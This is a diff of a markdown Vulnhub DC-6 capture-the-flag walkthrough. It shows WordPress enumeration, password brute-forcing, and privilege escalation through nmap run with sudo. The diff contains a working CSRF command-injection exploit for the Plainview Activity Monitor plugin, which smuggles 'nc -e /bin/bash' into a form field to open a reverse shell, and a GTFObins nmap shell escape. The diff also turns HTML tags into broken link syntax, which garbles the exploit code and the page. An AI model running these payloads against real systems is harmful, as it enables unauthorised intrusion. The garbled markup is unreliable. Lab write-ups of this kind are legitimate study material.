@@ -6,7 +6,7 @@ tags: ['easy','wordpress','sudo']
 categories: Vulnhub
 ---
 
-![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/dc6/1.png)<br/>
+![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/dc6/1.png)[br/](br/)
 Today, We are going to pwn DC 6 by DCAU7 from Vulnhub
 
 
@@ -18,7 +18,7 @@ The ultimate goal of this challenge is to get root and to read the one and only 
 Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.
 For beginners, Google can be of great assistance, but you can always  tweet me at @DCAU7 for assistance to get you going again. But take note:  I won't give you the answer,instead, I'll give you an idea about how  to move forward.
 
-Download Link:<https://www.vulnhub.com/entry/dc-6,315/>
+Download Link:[https://www.vulnhub.com/entry/dc-6,315/](https://www.vulnhub.com/entry/dc-6,315/)
 
 
 Lets Begin with our Initial Scan
@@ -76,7 +76,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 ```
 Nothing Interesting
 
-![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/dc6/1.png)<br/>
+![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/dc6/1.png)[br/](br/)
 Since it is a wordpress site , Lets run ``Wpscan`` to enumerate any user or find any vulnerable plugins.
 
 ![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/dc6/2.png)
@@ -88,7 +88,7 @@ Lets start bruteforcing them.
 But the creator give us a hint 
 ![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/dc6/3.png)
 
-Now we can bruteforce easily!<br/>
+Now we can bruteforce easily![br/](br/)
 ![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/dc6/4.png)
 ![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/dc6/5.png)
 
@@ -113,7 +113,7 @@ I changed some
 ```
 
 ```
-<html>
+[html](html)
   <!--  Wordpress Plainview Activity Monitor RCE
         [+] Version: 20161228 and possibly prior
         [+] Description: Combine OS Commanding and CSRF to get reverse shell
@@ -122,15 +122,15 @@ I changed some
         [+] Usage: Replace 127.0.0.1 & 9999 with you ip and port to get reverse shell
         [+] Note: Many reflected XSS exists on this plugin and can be combine with this exploit as well
   -->
-  <body>
-  <script>history.pushState('', '', '/')</script>
-    <form action="http://wordy/wp-admin/admin.php?page=plainview_activity_monitor&tab=activity_tools" method="POST" enctype="multipart/form-data">
-      <input type="hidden" name="ip" value="google.fr| nc -e /bin/bash 10.0.2.18 9999" />
-      <input type="hidden" name="lookup" value="Lookup" />
-      <input type="submit" value="Submit request" />
-    </form>
-  </body>
-</html>
+  [body](body)
+  [script](script)history.pushState('', '', '/')[/script](/script)
+    [form action="http://wordy/wp-admin/admin.php?page=plainview_activity_monitor&tab=activity_tools" method="POST" enctype="multipart/form-data"](form action="http://wordy/wp-admin/admin.php?page=plainview_activity_monitor&tab=activity_tools" method="POST" enctype="multipart/form-data")
+      [input type="hidden" name="ip" value="google.fr| nc -e /bin/bash 10.0.2.18 9999" /](input type="hidden" name="ip" value="google.fr| nc -e /bin/bash 10.0.2.18 9999" /)
+      [input type="hidden" name="lookup" value="Lookup" /](input type="hidden" name="lookup" value="Lookup" /)
+      [input type="submit" value="Submit request" /](input type="submit" value="Submit request" /)
+    [/form](/form)
+  [/body](/body)
+[/html](/html)
 ```
 
 Saved it and Open that ``.html`` and listening on my machine.
@@ -171,7 +171,7 @@ It looks like we can run ``nmap`` with sudo rights.
 
 I searched on ``GTFObins``
 
-> <https://gtfobins.github.io/gtfobins/nmap/>
+> [https://gtfobins.github.io/gtfobins/nmap/](https://gtfobins.github.io/gtfobins/nmap/)
 
 ```
 echo 'os.execute("/bin/sh")' > $TF
